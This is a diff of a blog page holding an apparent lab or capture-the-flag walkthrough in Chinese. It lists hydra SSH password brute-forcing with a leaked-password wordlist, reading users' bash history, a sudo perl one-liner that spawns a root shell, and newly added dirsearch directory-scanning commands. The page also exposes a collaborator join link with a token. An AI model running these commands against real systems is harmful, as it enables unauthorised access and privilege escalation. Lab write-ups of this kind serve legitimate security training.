@@ -201,7 +201,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>December 29, 2023</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>8627</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>9056</span>
     </div>
   </div>
 </section>
@@ -276,12 +276,12 @@
 <p>steghide extract -sf trytofind.jpg</p>
 <p>cat data.txt</p>
 <p>hydra -l renu -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;Passwords&#x2F;darkweb2017-top10000.txt ssh:&#x2F;&#x2F;192.168.56.101</p>
-<p>ssh <a href="mailto:&#114;&#x65;&#110;&#117;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#53;&#x36;&#46;&#x31;&#48;&#49;">&#114;&#x65;&#110;&#117;&#x40;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#53;&#x36;&#46;&#x31;&#48;&#49;</a></p>
+<p>ssh <a href="mailto:&#114;&#x65;&#110;&#x75;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#53;&#54;&#46;&#x31;&#48;&#49;">&#114;&#x65;&#110;&#x75;&#64;&#x31;&#57;&#50;&#x2e;&#x31;&#x36;&#56;&#46;&#53;&#54;&#46;&#x31;&#48;&#49;</a></p>
 <p>ls</p>
 <p>cat user1.txt</p>
 <p>ls -al</p>
 <p>cat .bash_history</p>
-<p>ssh <a href="mailto:&#x6c;&#x69;&#108;&#x79;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#53;&#54;&#x2e;&#x31;&#48;&#x31;">&#x6c;&#x69;&#108;&#x79;&#x40;&#49;&#57;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#53;&#54;&#x2e;&#x31;&#48;&#x31;</a></p>
+<p>ssh <a href="mailto:&#x6c;&#x69;&#108;&#x79;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x35;&#54;&#x2e;&#x31;&#x30;&#x31;">&#x6c;&#x69;&#108;&#x79;&#64;&#x31;&#57;&#50;&#x2e;&#49;&#x36;&#x38;&#x2e;&#x35;&#54;&#x2e;&#x31;&#x30;&#x31;</a></p>
 <p>ls -al</p>
 <p>cat user2.txt</p>
 <p>sudo perl -e ‘exec”&#x2F;bin&#x2F;sh”;’</p>
@@ -290,7 +290,8 @@
 <p>cat .root.txt</p>
 <p>相关操作命令：<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
 <p>靶场参考<a target="_blank" rel="noopener" href="https://www.yuque.com/g/sunwu-pbywz/baji/un4pf9/collaborator/join?token=qFv08WRcPtc1ivgS&source=doc_collaborator#">https://www.yuque.com/g/sunwu-pbywz/baji/un4pf9/collaborator/join?token=qFv08WRcPtc1ivgS&amp;source=doc_collaborator#</a> </p>
-<h5 id="相关知识点："><a href="#相关知识点：" class="headerlink" title="相关知识点："></a>相关知识点：</h5><h6 id="perl提权"><a href="#perl提权" class="headerlink" title="perl提权"></a>perl提权</h6><p>通过生成交互式系统 shell 来脱离受限环境。</p>
+<h5 id="相关知识点："><a href="#相关知识点：" class="headerlink" title="相关知识点："></a>相关知识点：</h5><h6 id="dirsearch"><a href="#dirsearch" class="headerlink" title="dirsearch"></a>dirsearch</h6><p><code>python3 dirsearch.py -u &quot;https://example.com&quot;</code><br>扫描<a target="_blank" rel="noopener" href="https://example.com网站/">https://example.com网站</a><br><code>python3 dirsearch.py -e php,html -u &quot;https://example.com&quot;</code><br>指定文件扩展名<br><code>python3 dirsearch.py -e php,html -u &quot;https://example.com&quot; -w /wordlist</code><br>指定字典<br><code>python3 dirsearch.py -e php -u &quot;https://example.com&quot; --prefixes .,admin,_</code><br>指定前缀，为 . admin _<br><code>python3 dirsearch.py -e php,html,txt -u &quot;https://example.com&quot; -t 20</code><br>指定线程数量–20</p>
+<h6 id="perl提权"><a href="#perl提权" class="headerlink" title="perl提权"></a>perl提权</h6><p>通过生成交互式系统 shell 来脱离受限环境。</p>
 <p>如果允许二进制文件以超级用户身份运行，则它不会删除提升的权限 <code>sudo</code> ，并且可用于访问文件系统、升级或维护特权访问。</p>
 <ul>
 <li><pre><code>sudo perl -e &#39;exec &quot;/bin/sh&quot;;&#39;
